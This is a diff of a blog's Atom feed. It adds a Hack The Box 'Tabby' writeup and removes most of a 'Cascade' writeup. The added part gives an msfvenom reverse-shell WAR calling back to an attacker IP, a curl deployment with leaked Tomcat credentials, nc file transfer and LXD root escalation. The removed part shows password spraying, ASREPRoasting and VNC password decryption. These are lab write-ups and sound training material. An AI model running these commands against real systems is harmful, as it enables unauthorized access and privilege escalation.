@@ -1,4 +1,193 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-09-14T02:23:20+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Medium] - TartarSauce</title><link href="http://localhost:4000/2022/08/21/TartarSauce.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Medium] - TartarSauce" /><published>2022-08-21T00:00:00+02:00</published><updated>2022-08-21T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/21/TartarSauce</id><content type="html" xml:base="http://localhost:4000/2022/08/21/TartarSauce.html"><![CDATA[<p><img src="/assets/TartarSauce/TartarSauce.png" alt="" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-09-16T11:40:05+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Easy] - Tabby</title><link href="http://localhost:4000/2022/08/24/Tabby.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Easy] - Tabby" /><published>2022-08-24T00:00:00+02:00</published><updated>2022-08-24T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/24/Tabby</id><content type="html" xml:base="http://localhost:4000/2022/08/24/Tabby.html"><![CDATA[<p><img src="/assets/Tabby/Tabby.png" alt="" /></p>
+
+<h2 id="summary">Summary</h2>
+<ul>
+  <li><strong>Tabby</strong> is a <strong>linux</strong> machine hosting both <strong>Apache web server</strong> and <strong>Tomcat</strong>.</li>
+  <li>The website on port 80 had a <strong>Directory Traversal vulnerability</strong> which enabled us to <strong>read a Tomcat configuration file</strong> which <strong>contained valid credentials.</strong></li>
+  <li><em>Using those,</em> we <strong>get a user with enough privileges to upload a WAR file containing a reverse shell</strong>. <em>And, with that</em>, we <strong>access the box</strong> as the <code class="language-plaintext highlighter-rouge">tomcat</code> user.</li>
+  <li>We find an <strong>encrypted backup archive in the webroot</strong>. We <strong>crack it</strong> with <code class="language-plaintext highlighter-rouge">john</code> to <strong>get a password.</strong></li>
+  <li>The password was <em>being reused</em> by another user on the box (<code class="language-plaintext highlighter-rouge">ash</code>). And, he happened to be <strong>a member of the <code class="language-plaintext highlighter-rouge">lxd</code> group.</strong></li>
+  <li>We <strong>escalate our privileges</strong> to <code class="language-plaintext highlighter-rouge">root</code> by <strong>creating a specially-configured container</strong>.</li>
+</ul>
+
+<hr />
+
+<h2 id="nmap">NMAP</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
+|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
+|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Mega Hosting
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+8080/tcp open  http    Apache Tomcat
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> gives us areas to check: the <strong>website on port 80</strong> and the <strong>Tomcat instance on port 8080</strong></p>
+
+<h2 id="port-80">Port 80</h2>
+<p>The home page here was mostly <strong>static content</strong>.</p>
+
+<p><img src="/assets/Tabby/homepage-port-80.jpg" alt="" /></p>
+
+<p><em>except for</em> the <strong>link for the “News” page.</strong></p>
+
+<p>note: <em>on the link below</em>, notice <em>how the host name changed</em> to <strong>“megahosting.htb”</strong></p>
+
+<p><img src="/assets/Tabby/virtual-host-routing.jpg" alt="" /></p>
+
+<p>an entry in our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> should take care of this <strong>Virtual Host Routing</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.194 megahosting.htb
+</code></pre></div></div>
+
+<p>we also notice that <code class="language-plaintext highlighter-rouge">news.php</code> handles <strong>a parameter</strong> called <code class="language-plaintext highlighter-rouge">file</code>. this looks like a <strong>file inclusion vulnerability.</strong></p>
+
+<p><img src="/assets/Tabby/lfi-spotted.jpg" alt="" /></p>
+
+<p>trying <code class="language-plaintext highlighter-rouge">/etc/passwd</code> in the parameter doesn’t work.</p>
+
+<p>but going <strong>4 directories back</strong> with <code class="language-plaintext highlighter-rouge">../../../../</code> gets us the <strong>confirmation</strong> we need.</p>
+
+<p><img src="/assets/Tabby/lfi-confirmed.jpg" alt="" /></p>
+
+<p><em>after a couple of tries to get the path right,</em> we are able to <strong>retrieve the source code</strong> of the <code class="language-plaintext highlighter-rouge">news.php</code> file:</p>
+
+<p><img src="/assets/Tabby/news-php-src-code.jpg" alt="" /></p>
+
+<p>the <code class="language-plaintext highlighter-rouge">fopen</code> function here makes this a <strong>Directory/Path Traversal vulnerability</strong> and <strong>not a Local File Inclusion.</strong></p>
+
+<p>that’s because <code class="language-plaintext highlighter-rouge">fopen</code> just <strong>reads a file’s contents</strong>. it <strong>doesn’t evaluate PHP code</strong> like <code class="language-plaintext highlighter-rouge">include</code> or <code class="language-plaintext highlighter-rouge">require</code></p>
+
+<p><strong><em>Knowing this bit spares us the effort of trying to get code execution by including PHP.</em></strong></p>
+
+<h2 id="reading-sensitive-files">Reading Sensitive Files</h2>
+<p><em>As a quick check,</em> I try to read the <code class="language-plaintext highlighter-rouge">ash</code> user’s <strong>private SSH key</strong> (<code class="language-plaintext highlighter-rouge">/home/ash/.ssh/id_rsa</code>). But it’s <em>not that easy</em> :)</p>
+
+<p>I then think “maybe I should check out the tomcat to avoid any rabbit holes”. In case there’s something to be found there.</p>
+
+<p><img src="/assets/Tabby/tomcat-homepage.jpg" alt="" /></p>
+
+<p>We get some <strong>decent information</strong> from this page. the <strong>webroot</strong> and <strong>where Tomcat is installed.</strong></p>
+
+<p><em>But, when it comes to sensitive files,</em> there’s <strong>a very important one</strong> called <code class="language-plaintext highlighter-rouge">tomcat-users.xml</code>. it’s in <code class="language-plaintext highlighter-rouge">/usr/share/tomcat9/etc/</code> by default.</p>
+
+<p>We found it there and got <strong>creds for a user</strong> with <strong>very nice privileges</strong> :]</p>
+
+<p><img src="/assets/Tabby/reading-tomcat-users-xml.jpg" alt="" /></p>
+
+<h2 id="exploiting-our-tomcat-privileges-for-rce">Exploiting our Tomcat Privileges for RCE</h2>
+<p>The <code class="language-plaintext highlighter-rouge">manager-script</code> role has access to <strong>upload WAR files.</strong></p>
+
+<p>to abuse this, we will generate a <strong>WAR reverse shell</strong> with <code class="language-plaintext highlighter-rouge">msfvenom</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.16.3 <span class="nv">lport</span><span class="o">=</span>9000 <span class="nt">-f</span> war <span class="nt">-o</span> revvy.war
+</code></pre></div></div>
+
+<p><img src="/assets/Tabby/creating-a-war-file.jpg" alt="" /></p>
+
+<p>then <strong>upload the WAR file</strong> using <code class="language-plaintext highlighter-rouge">curl</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-v</span> <span class="nt">-u</span> tomcat:<span class="s1">'$3cureP4s5w0rd123!'</span> <span class="nt">-T</span> revvy.war <span class="s2">"http://tabby:8080/manager/text/deploy?path=/shell&amp;update=true"</span>
+</code></pre></div></div>
+
+<p>start up a <code class="language-plaintext highlighter-rouge">netcat</code> listener on port 9000</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 9000
+</code></pre></div></div>
+
+<p>and <code class="language-plaintext highlighter-rouge">curl</code> the endpoint to hit and trigger our reverse shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://tabby:8080/shell
+</code></pre></div></div>
+
+<p><img src="/assets/Tabby/shell-as-tomcat.jpg" alt="" /></p>
+
+<p>we’re in as <code class="language-plaintext highlighter-rouge">tomcat</code> :)</p>
+
+<h2 id="pivoting-with-password-reuse">Pivoting with Password Reuse</h2>
+
+<p><em>Right after improving our shell,</em> we start with <strong>checking the files</strong> in <code class="language-plaintext highlighter-rouge">/var/www/html</code></p>
+
+<p>there was a folder called <code class="language-plaintext highlighter-rouge">files</code>. It contained a <strong>password-protected zip archive</strong> that was <strong>owned by</strong> the <code class="language-plaintext highlighter-rouge">ash</code> user.</p>
+
+<p><img src="/assets/Tabby/finding-ashes-zip-file.jpg" alt="" /></p>
+
+<p>we <strong>transfer it over</strong> to our kali using <code class="language-plaintext highlighter-rouge">netcat</code> so we can <strong>crack</strong> it</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># on tabby</span>
+nc <span class="nt">-lvnp</span> 5000 &lt; 16162020_backup.zip
+<span class="c"># on our kali</span>
+nc tabby 5000 <span class="o">&gt;</span> ash_backup.zip
+</code></pre></div></div>
+
+<p><em>and, to verify that the file wasn’t corrupted in-transit,</em> we do a quick <strong>integrity check</strong> using <code class="language-plaintext highlighter-rouge">md5sum</code>.</p>
+
+<p><img src="/assets/Tabby/transferring-zip-file.jpg" alt="" /></p>
+
+<p>we use <code class="language-plaintext highlighter-rouge">zip2john</code> to <strong>get a hash</strong> for <code class="language-plaintext highlighter-rouge">john</code> to crack.</p>
+
+<p><img src="/assets/Tabby/zip-password.jpg" alt="" /></p>
+
+<p>it successfully cracked. but we <em>didn’t find anything important</em> within the archive itself.</p>
+
+<p><img src="/assets/Tabby/zip-files.jpg" alt="" /></p>
+
+<p>the files were practically <strong><em>the same as the original ones.</em></strong></p>
+
+<p><em>But, since we now had a password,</em> we tried it against <code class="language-plaintext highlighter-rouge">ash</code> and <code class="language-plaintext highlighter-rouge">root</code></p>
+
+<p>didn’t work with <code class="language-plaintext highlighter-rouge">root</code>, but <strong>did</strong> with <code class="language-plaintext highlighter-rouge">ash</code> :)</p>
+
+<p><img src="/assets/Tabby/logged-in-as-ash.jpg" alt="" /></p>
+
+<h2 id="lxd-privilege-escalation">LXD Privilege Escalation</h2>
+<p><em>As you may have noticed from the previous image,</em> <code class="language-plaintext highlighter-rouge">ash</code> is part of the <code class="language-plaintext highlighter-rouge">lxd</code> group</p>
+
+<p><img src="/assets/Tabby/lxd-group-membership.jpg" alt="" /></p>
+
+<p>this is <em>almost exactly the same situation</em> as in the <a href="https://omnisl4sh.github.io/2022/08/17/Brainfuck.html#lxd-privilege-escalation">Brainfuck Privesc</a>.</p>
+
+<p>one <em>minor difference</em> is that <strong>we have to initialize the LX daemon</strong> with <code class="language-plaintext highlighter-rouge">lxd init</code> before importing the image.</p>
+
+<p>note: also make sure to add <code class="language-plaintext highlighter-rouge">/snap/bin</code> to the <code class="language-plaintext highlighter-rouge">PATH</code> environment variable as <em>it’s not there by default.</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/snap/bin/
+</code></pre></div></div>
+
+<p><img src="/assets/Tabby/lxd-init.jpg" alt="" /></p>
+
+<p><em>for a bit of automation,</em> we’re going to throw the commands into a <strong>bash script</strong>. here are the contents:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+lxc image import alpine-small-image.tar.gz <span class="nt">--alias</span> myimage
+lxc image list
+lxc init myimage mycontainer <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true
+</span>lxc config device add mycontainer mydevice disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true
+</span>lxc start mycontainer
+lxc <span class="nb">exec </span>mycontainer /bin/sh
+</code></pre></div></div>
+
+<p><em>after getting the container root shell,</em> we add an <strong>SUID bit</strong> to the host’s <strong>bash shell</strong> so we can run it as <code class="language-plaintext highlighter-rouge">root</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +s /mnt/root/bin/bash
+</code></pre></div></div>
+
+<p><img src="/assets/Tabby/lxc-root-bash-script.jpg" alt="" /></p>
+
+<h2 id="cleaning-up">Cleaning Up</h2>
+
+<p><em>To clear away remnants,</em> we have to <strong>stop the container</strong>, <strong>delete it</strong> along with <strong>the image we imported.</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc stop mycontainer
+lxc delete mycontainer
+lxc image delete myimage
+</code></pre></div></div>
+
+<p><img src="/assets/Tabby/lxc-cleanup.jpg" alt="" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Linux - Medium] - TartarSauce</title><link href="http://localhost:4000/2022/08/21/TartarSauce.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Medium] - TartarSauce" /><published>2022-08-21T00:00:00+02:00</published><updated>2022-08-21T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/21/TartarSauce</id><content type="html" xml:base="http://localhost:4000/2022/08/21/TartarSauce.html"><![CDATA[<p><img src="/assets/TartarSauce/TartarSauce.png" alt="" /></p>
 
 <h2 id="summary">Summary</h2>
 <ul>
@@ -3163,384 +3352,4 @@ Host script results:
   <li><strong>Will Schroeder</strong> and <strong>Lee Christensen</strong> who wrote the paper that started it all <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">here</a></li>
   <li><a href="https://twitter.com/ly4k_">Oliver Lyak</a> who discovered, reported and explained the vulnerability <a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">here</a> as well as created the <code class="language-plaintext highlighter-rouge">Certipy</code> tool.</li>
   <li><strong>SecureAuthCorp</strong> for the awesome <strong>Impacket</strong> scripts of course :D</li>
-</ul>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Cascade</title><link href="http://localhost:4000/2022/05/07/Cascade.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Cascade" /><published>2022-05-07T00:00:00+02:00</published><updated>2022-05-07T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/07/Cascade</id><content type="html" xml:base="http://localhost:4000/2022/05/07/Cascade.html"><![CDATA[<p><img src="/assets/Cascade/Cascade.png" alt="Cascade" /></p>
-
-<h2 id="summary">Summary</h2>
-<ul>
-  <li><em>Noticing the open ports</em>: <strong>DNS, Kerberos, LDAP &amp; SMB</strong>, we know we’re up against a <strong>Windows Domain Controller</strong>.</li>
-  <li><strong>LDAP Enumeration</strong> reveals a <em>base-64 encoded</em> password which was <em>embedded</em> in a unique <strong>Active Directory</strong> user attribute.</li>
-  <li>Decoding the password grants us access to the <code class="language-plaintext highlighter-rouge">r.thompson</code> user who happens to have <code class="language-plaintext highlighter-rouge">read</code> access to the <code class="language-plaintext highlighter-rouge">data</code> <strong>SMB</strong> share.</li>
-  <li><em>Exploring the share,</em> we find a <code class="language-plaintext highlighter-rouge">VNC</code>-related <code class="language-plaintext highlighter-rouge">.reg</code> file which contains an encrypted password in hexadecimal format.</li>
-  <li>We also find an e-mail about a <em>deleted</em> user (<code class="language-plaintext highlighter-rouge">TempAdmin</code>) who has a similar password to the normal (admin) user.</li>
-  <li><em>After we crack the</em> <strong>VNC</strong> <em>password with a tool called</em> <code class="language-plaintext highlighter-rouge">vncpwd</code>, we gain access to the <code class="language-plaintext highlighter-rouge">s.smith</code> user.</li>
-  <li><em>While enumerating SMB access for</em> <code class="language-plaintext highlighter-rouge">s.smith</code>, we find that he has <code class="language-plaintext highlighter-rouge">read</code> access to the <code class="language-plaintext highlighter-rouge">audit</code> share.</li>
-  <li>The <code class="language-plaintext highlighter-rouge">audit</code> share contained an <code class="language-plaintext highlighter-rouge">sqlite3</code> database file. <em>When enumerating it,</em> we find an encrypted password for the <code class="language-plaintext highlighter-rouge">arksvc</code> user.</li>
-  <li>We also find two files <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> and <code class="language-plaintext highlighter-rouge">CasCrypto.dll</code> which we reverse to find the necessary information to decrypt the <code class="language-plaintext highlighter-rouge">arksvc</code> password.</li>
-  <li>We authenticate as the <code class="language-plaintext highlighter-rouge">arksvc</code> user and find that he’s a member of a special group: <code class="language-plaintext highlighter-rouge">AD Recycle Bin</code>.</li>
-  <li><em>Combining this information with the e-mail contents,</em> we’re enticed to check the deleted AD users.</li>
-  <li><em>Using</em> <strong>PowerShell</strong> <em>to fetch the deleted users with all their properties,</em> we find the password for the <code class="language-plaintext highlighter-rouge">Administrator</code> account in a unique attribute of the <code class="language-plaintext highlighter-rouge">TempAdmin</code> user. We use it to authenticate and we gain <strong>full access</strong> to the machine.</li>
-</ul>
-
-<hr />
-
-<h2 id="nmap">Nmap</h2>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
-| dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-06 11:02:19Z)
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
-445/tcp   open  microsoft-ds?
-636/tcp   open  tcpwrapped
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
-3269/tcp  open  tcpwrapped
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-49154/tcp open  msrpc         Microsoft Windows RPC
-49155/tcp open  msrpc         Microsoft Windows RPC
-49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49158/tcp open  msrpc         Microsoft Windows RPC
-49170/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-security-mode: 
-|   2.1: 
-|_    Message signing enabled and required
-| smb2-time: 
-|   date: 2022-05-06T11:03:13
-|_  start_date: 2022-05-06T10:54:20
-</code></pre></div></div>
-<p><strong>DNS + Kerberos + LDAP + SMB = Domain Controller :D</strong></p>
-
-<p><strong>WinRM</strong> = Shell Access maybe :)</p>
-
-<p><em>From</em> <code class="language-plaintext highlighter-rouge">nmap</code> <em>version detection and scripts:</em></p>
-<ul>
-  <li><strong>OS:</strong> Windows Server 2008 R2 SP1</li>
-  <li><strong>Domain Name:</strong> Cascade.local</li>
-  <li><strong>Host name:</strong> CASC-DC1</li>
-</ul>
-
-<h2 id="checkpoint-listing-possible-enumerationexploitation-paths">Checkpoint: Listing Possible Enumeration/Exploitation Paths</h2>
-<p><em>Having the port data,</em> we go over our <strong>game plan</strong>:</p>
-
-<p><img src="/assets/Cascade/ad-gameplan-map.jpg" alt="ad-gameplan-map" /></p>
-
-<h2 id="down-to-business-rpc">Down to business: RPC</h2>
-<p><code class="language-plaintext highlighter-rouge">enum4linux-ng</code> (https://github.com/cddmp/enum4linux-ng) is a really nice revamp of the old <code class="language-plaintext highlighter-rouge">enum4linux</code> tool.</p>
-
-<p>we run it using the <code class="language-plaintext highlighter-rouge">-A</code> switch as well as <code class="language-plaintext highlighter-rouge">-oY</code> to output into <strong>YAML format</strong>.</p>
-
-<p><strong>Command:</strong></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux-ng <span class="nt">-A</span> 10.10.10.182 <span class="nt">-oY</span> e4lng-output
-</code></pre></div></div>
-
-<p>we get a bunch of cool stuff:</p>
-
-<ul>
-  <li><strong>Usernames</strong></li>
-</ul>
-
-<p><img src="/assets/Cascade/e4lng-output-users.jpg" alt="e4lng-output-users" /></p>
-
-<ul>
-  <li><strong>Groups</strong></li>
-</ul>
-
-<p><img src="/assets/Cascade/e4lng-output-groups.jpg" alt="e4lng-output-groups" /></p>
-
-<ul>
-  <li><strong>Password Policy</strong></li>
-</ul>
-
-<p><img src="/assets/Cascade/e4lng-output-pass-pol.jpg" alt="e4lng-output-pass-pol" /></p>
-
-<p>This is great! We have a userlist that we can use to do <strong>ASREPRoasting</strong> and we can do <strong>Password Spraying</strong> without locking anyone out.</p>
-
-<h2 id="time-saving-1-asreproasting">Time Saving #1: ASREPRoasting</h2>
-<p><em>To save time,</em> we’re going to do the <strong>ASREPRoast</strong> first because it’s a quick check and has a high chance of giving us creds (<em>if we crack the hash</em>).</p>
-
-<p><strong>Command:</strong></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetNPUsers.py <span class="nt">-dc-ip</span> 10.10.10.182 <span class="nt">-request</span> <span class="nt">-debug</span> <span class="nt">-usersfile</span> users.txt cascade.local/
-</code></pre></div></div>
-
-<p><strong>Note:</strong> <em>I generally prefer to use the</em> <code class="language-plaintext highlighter-rouge">-debug</code> <em>flag with everything. It can save me a lot of time in troubleshooting.</em></p>
-
-<p><img src="/assets/Cascade/asreproast-results.jpg" alt="asreproast-results" /></p>
-
-<p>We find no accounts that don’t require <strong>kerberoes preauthentication.</strong></p>
-
-<p>we also notice some accounts got another type of error: <code class="language-plaintext highlighter-rouge">KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</code>. <em>more on those later :)</em></p>
-
-<h2 id="time-saving-2-password-spraying-in-the-background">Time Saving #2: Password Spraying in the background</h2>
-<p><em>Since the password policy contained no user lockout,</em> we’re good to go spraying :D</p>
-
-<p><strong>Command:</strong></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">cat</span> /opt/Seclists/Passwords/Common-Credentials/500-worst-passwords.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span>kerbrute passwordspray <span class="nt">--dc</span> 10.10.10.182 <span class="nt">-d</span> cascade.local users.txt <span class="nv">$i</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[\+\].*'</span><span class="p">;</span> <span class="k">done</span>
-</code></pre></div></div>
-
-<p>what this does:</p>
-
-<p>it will spray using common passwords and only show us the output if it catches something.</p>
-
-<p>This is <em>mainly</em> to avoid filling up the screen with junk.</p>
-
-<p>Note on the error we get when <strong>ASREPRoasting:</strong></p>
-
-<p><em>Upon spraying,</em> we know that the users that got the <code class="language-plaintext highlighter-rouge">KDC_ERR_CLIENT_REVOKED</code> were in fact locked out.</p>
-
-<p>Another benefit of the verbosity with <code class="language-plaintext highlighter-rouge">-v</code> :)</p>
-
-<p><img src="/assets/Cascade/locked-out-users.jpg" alt="locked-out-users" /></p>
-
-<h2 id="smb-enumeration">SMB Enumeration</h2>
-<p><em>While we leave our spray running,</em> we’re going to enumerate <strong>SMB shares</strong> using <code class="language-plaintext highlighter-rouge">crackmapexec</code></p>
-
-<p><img src="/assets/Cascade/crackmapexec-smb-enum.jpg" alt="crackmapexec-smb-enum" /></p>
-
-<p>Notice that we test with the <code class="language-plaintext highlighter-rouge">cascguest</code> user on the 3rd attempt.</p>
-
-<p>This is because it was there in the <code class="language-plaintext highlighter-rouge">enum4linux-ng</code> output.</p>
-
-<p><img src="/assets/Cascade/casc-guest.jpg" alt="casc-guest" /></p>
-
-<h2 id="ldap">LDAP</h2>
-<p>We’re going to enumerate <strong>LDAP</strong> and see if we can find something there.</p>
-
-<p><strong>Command:</strong></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.10.182 <span class="nt">-b</span> <span class="s1">'dc=cascade,dc=local'</span>
-</code></pre></div></div>
-
-<p>The output was huge (6k+ lines). So we saved it to <code class="language-plaintext highlighter-rouge">ldap-output</code></p>
-
-<p><img src="/assets/Cascade/ldap-output-huge.jpg" alt="ldap-output-huge" /></p>
-
-<p>we’re going to use a <code class="language-plaintext highlighter-rouge">grep</code> with some <strong>Regex Kung Fu</strong> to get rid of any unnecessary information.</p>
-
-<p><strong>Regex:</strong> <code class="language-plaintext highlighter-rouge">^\w+:</code></p>
-
-<p><strong>English:</strong> Get us any line that starts (<code class="language-plaintext highlighter-rouge">^</code>) with a bunch of characters (<code class="language-plaintext highlighter-rouge">\w+</code>) followed by a semicolon (<code class="language-plaintext highlighter-rouge">:</code>).</p>
-
-<p>We then follow up with a <code class="language-plaintext highlighter-rouge">sort</code> using the <code class="language-plaintext highlighter-rouge">-u</code> flag to get <em>only the signicant attributes.</em></p>
-
-<p><img src="/assets/Cascade/regex-kung-fu.jpg" alt="regex-kung-fu" /></p>
-
-<p>100 lines is much better XD</p>
-
-<p><em>While sifting through the attributes,</em> we came across this:</p>
-
-<p><img src="/assets/Cascade/ldap-uniq-attrib.jpg" alt="ldap-uniq-attrib" /></p>
-
-<p><img src="/assets/Cascade/ldap-uniq-attrib-val.jpg" alt="ldap-uniq-attrib-val" /></p>
-
-<p><em>Since it has an</em> <code class="language-plaintext highlighter-rouge">=</code> <em>at the end,</em> we try to decode it using <code class="language-plaintext highlighter-rouge">base64 -d</code></p>
-
-<p><img src="/assets/Cascade/ldap-uniq-attrib-pass-decoded.jpg" alt="ldap-uniq-attrib-pass-decoded" /></p>
-
-<p>This attribute belonged to the <code class="language-plaintext highlighter-rouge">r.thompson</code> user.</p>
-
-<p>Authentication succeded with it. But we didn’t get code execution with <strong>WinRM</strong> :/</p>
-
-<p><img src="/assets/Cascade/ryan-creds-check.jpg" alt="ryan-creds-check" /></p>
-
-<h2 id="kerberoasting">Kerberoasting</h2>
-<p><em>Applying the same strategy as before,</em> we’re going to <strong>kerberoast.</strong></p>
-
-<p><img src="/assets/Cascade/kerberoasting.jpg" alt="kerberoasting" /></p>
-
-<p>No results there.</p>
-
-<h2 id="smb-access-with-rthompson">SMB Access with <code class="language-plaintext highlighter-rouge">R.Thompson</code></h2>
-<p>We’re going to use a <code class="language-plaintext highlighter-rouge">crackmapexec</code> module called <code class="language-plaintext highlighter-rouge">spider_plus</code>.</p>
-
-<p>It essentially crawls the <code class="language-plaintext highlighter-rouge">SMB</code> share and returns a list of files that we have access to.</p>
-
-<p><img src="/assets/Cascade/cme-spider-plus.jpg" alt="cme-spider-plus" /></p>
-
-<p>Here’s what it found:</p>
-
-<p><img src="/assets/Cascade/cme-spider-plus-results.jpg" alt="cme-spider-plus-results" /></p>
-
-<p><em>In the</em> <code class="language-plaintext highlighter-rouge">Data</code> <em>share,</em> the contents of the <code class="language-plaintext highlighter-rouge">Meeting_Notes_June_2018.html</code> were interesting:</p>
-
-<p><img src="/assets/Cascade/email-contents.jpg" alt="email-contents" /></p>
-
-<p><em>According to the mail,</em> a user called <code class="language-plaintext highlighter-rouge">TempAdmin</code> which has the same password as the normal admin (<code class="language-plaintext highlighter-rouge">Administrator</code> <em>probably</em>) should be deleted at the end of 2018.</p>
-
-<p>We note this down and make sure to be on the lookout for any information regarding that user.</p>
-
-<p>When we look at the <code class="language-plaintext highlighter-rouge">ArkAdRecycleBin.log</code> we get a confirmation that the <code class="language-plaintext highlighter-rouge">TempAdmin</code> user has in fact been deleted.</p>
-
-<p><img src="/assets/Cascade/ark-ad-recycle-bin.jpg" alt="ark-ad-recycle-bin" /></p>
-
-<p>We find something very intersting in the <code class="language-plaintext highlighter-rouge">VNC Install.reg</code> file:</p>
-
-<p><img src="/assets/Cascade/tight-vnc-password.jpg" alt="tight-vnc-password" /></p>
-
-<h2 id="cracking-vnc-passwords">Cracking VNC Passwords</h2>
-<p>We’re interested in cracking this <strong>VNC</strong> password and reusing it.</p>
-
-<p><em>Luckily,</em> a tool called <code class="language-plaintext highlighter-rouge">vncpwd</code> (https://github.com/jeroennijhof/vncpwd) can easily do that.</p>
-
-<p>we clone the repo using <code class="language-plaintext highlighter-rouge">git clone https://github.com/jeroennijhof/vncpwd</code> and follow up with a <code class="language-plaintext highlighter-rouge">make</code> command to build it.</p>
-
-<p>We then get the hex string, reverse it with <code class="language-plaintext highlighter-rouge">xxd</code> using the <code class="language-plaintext highlighter-rouge">-r</code> and <code class="language-plaintext highlighter-rouge">-p</code> flags and decrypt it.</p>
-
-<p><img src="/assets/Cascade/vnc-pwd-cracked.jpg" alt="vnc-pwd-cracked" /></p>
-
-<h2 id="password-reuse">Password Reuse</h2>
-<p><em>Having a new password</em> <code class="language-plaintext highlighter-rouge">sT333ve2</code>, we’re going to to spray it all over the domain users we’ve collected.</p>
-
-<p><img src="/assets/Cascade/steve-ad-user-owned.jpg" alt="steve-ad-user-owned" /></p>
-
